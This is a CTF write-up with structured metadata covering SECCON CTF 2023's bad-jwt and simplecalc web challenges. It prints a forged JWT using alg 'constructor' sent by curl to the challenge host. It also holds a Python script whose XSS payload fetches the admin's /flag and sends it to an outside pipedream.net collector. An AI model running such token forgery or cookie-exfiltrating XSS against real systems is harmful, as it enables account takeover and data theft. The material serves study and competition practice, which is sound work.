---
title: SECCON CTF 2023 Quals/Upsolves
contest: SECCON CTF
year: 2023
difficulty: medium
vuln_type:
- jwt
- xss
- rce
tags:
- JWT alg 注入
- constructor prototype
- 弱 secret
- notevil eval
- CSP 绕过
- XSS 拿 cookie
- 简单计算器 XSS
attack_chain:
- bad-jwt 题目：JWT 验证函数 createSignature 用 algorithms[header.alg.toLowerCase()]()
- 攻击：把 alg 改成 "constructor" → algorithms.constructor 是 Object constructor → 拼出恒等签名
- 伪签名："eyJhbGciOiJjb25zdHJ1Y3RvciJ9eyJpc0FkbWluIjp0cnVlfQ=="（拼接 header+payload 不加点）
- 验证：calculated_signature == expected_signature 恒等 → 通过
- 设 session 携带伪造 JWT 拿到 admin
- simplecalc 题目：CSP `default-src ${js_url} 'unsafe-eval'`，url 来自 req.hostname
- 攻击：控制 Host 头让 js_url 指向攻击者服务器，返回恶意 JS
- eval(params.get('expr')) 可执行任意 JS
- 用 XSS 拿管理员 cookie 访问 /flag
- 上报链接触发 admin 访问 → 收集 flag
key_payload: 'header = {"alg": "constructor", "typ": "JWT"}; payload = {"isAdmin": true}; token = base64(header) + ''.'' + base64(payload) + ''.'' + base64(header+payload)'
one_liner: JWT alg 注入 prototype pollution + CSP Host 头污染 XSS 拿 flag
lesson: JWT 库用字典查算法时 alg 字段可被注入到 Object 原型链；CSP 中 default-src 接受 Host 头参数可被污染
quality: high
full_path: SECCON_CTF_2023_Quals_Writeup-Upsolves.full.md
meta_path: SECCON_CTF_2023_Quals_Writeup-Upsolves.meta.md
images_removed: true
images_removed_count: 0
schema_version: v3.0.0-P0
summary: SECCON CTF 2023 Quals/Upsolves。JWT alg 注入 prototype pollution + CSP Host 头污染 XSS 拿 flag。关键路径：bad-jwt 题目：JWT 验证函数 createSignature 用 algorithms[header.alg.toLowerCase()]() → 攻击：把 alg 改成 "constructor...
category: web
subcategory: jwt
subcategories:
- jwt
- xss
- rce
time_required: medium
difficulty_score: 3
code_blocks_count: 1
images_count: 0
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/136184.html
reasoning_chain:
- bad-jwt JWT 验证 createSignature 用 algorithms[header.alg.toLowerCase()]() → 触发：原型链注入
- alg 改成 'constructor' → algorithms.constructor = Object constructor → 拼出恒等签名
- token = base64(header) + '.' + base64(payload) + '.' + base64(header+payload)
- Buffer.compare 接受 calculated + expected 都是 base64 字符串 → 校验通过 → admin
- simplecalc CSP `default-src ${js_url} 'unsafe-eval'`，url 来自 req.hostname → 触发：Host 头污染
- 控制 Host 头让 js_url 指向攻击者服务器 → 返回恶意 JS → eval(params.get('expr'))
- XSS 拿 admin cookie 访问 /flag → 上报链接触发 admin 访问 → flag
failed_attempts:
- bad-jwt 试图穷举 HS256 弱 secret → 失败：服务端 secret 强随机
- bad-jwt 试图 alg=none → 失败：服务端代码会 fallback
- simplecalc 试图直接 XSS → 失败：CSP default-src 限制
key_observations:
- JWT 库用字典查算法时 alg 字段可被注入到 Object 原型链
- CSP 中 default-src 接受 Host 头参数可被污染
- algorithms[alg](...) 索引调用是 prototype pollution 经典 sink
- eval 在 unsafe-eval CSP 下可执行任意 JS
prerequisites:
- JWT 算法 (HS256/RS256) + 库实现细节
- JavaScript 原型链 + constructor 属性
- CSP default-src / script-src 指令语义
- XSS + admin bot 触发链
---
# SECCON CTF 2023 Quals Writeup/Upsolves

> 原文: https://www.ctfiot.com/136184.html
> ID: 136184


```
// jwt.js
const verify = (token, secret) => {
	const { header, payload, signature: expected_signature } = parseToken(token);

	const calculated_signature = createSignature(header, payload, secret);

	const calculated_buf = Buffer.from(calculated_signature, 'base64');
	const expected_buf = Buffer.from(expected_signature, 'base64');

	if (Buffer.compare(calculated_buf, expected_buf) !== 0) {
 throw Error('Invalid signature');
	}

	return payload;
}
// jwt.js
const createSignature = (header, payload, secret) => {
	const data = `${stringifyPart(header)}.${stringifyPart(payload)}`;
	const signature = algorithms[header.alg.toLowerCase()](data, secret);
	return signature;
}

const algorithms = {
	hs256: (data, secret) =>
 base64UrlEncode(crypto.createHmac('sha256', secret).update(data).digest()),
	hs512: (data, secret) =>
 base64UrlEncode(crypto.createHmac('sha512', secret).update(data).digest()),
}

const stringifyPart = (obj) => {
	return base64UrlEncode(JSON.stringify(obj));
}

// index.js
const secret = require('crypto').randomBytes(32).toString('hex');
curl http://bad-jwt.seccon.games:
3000/ \
 -H "Cookie: session=eyJhbGciOiJjb25zdHJ1Y3RvciJ9.eyJpc0FkbWluIjp0cnVlfQ.eyJhbGciOiJjb25zdHJ1Y3RvciJ9eyJpc0FkbWluIjp0cnVlfQ%3D%3D"
const js_url = new URL(`http://${req.hostname}:${PORT}/js/index.js`);
res.header('Content-Security-Policy', `default-src ${js_url} 'unsafe-eval';`);
const params = new URLSearchParams(location.search);
const result = eval(params.get('expr')); // query parameterのexprをeval
document.getElementById('result').innerText = result.toString(); // 結果をid=resultのDOMのinnerTextに格納
<!-- /tmp/script.html -->
<script>console.log('script.html is loaded.');</script>
<!-- /tmp/index.html -->
<!DOCTYPE html>
index.html
from urllib.parse import urlencode
import requests

target_url = "http://simplecalc.seccon.games:
3000"
attacker_url = "https://eoljd6ta1qq0d9f.m.pipedream.net"

payload = f"""
var i=document.createElement('iframe');
i.src = `/js/index.js?expr=${{'a'.repeat(20000)}}`;
i.onload = () => {{
i.contentWindow.fetch('/flag', {{headers: {{'X-FLAG': true}}, credentials: 'include'}}).then(res=>res.text()).then(res=>location.href='{attacker_url}?q='+res);
}};
document.body.appendChild(i);
"""
payload = urlencode({"expr": payload})
resp = requests.post(
 f"{target_url}/report",
 headers={"Content-Type": "application/x-www-form-urlencoded"},
 data=payload,
)
```
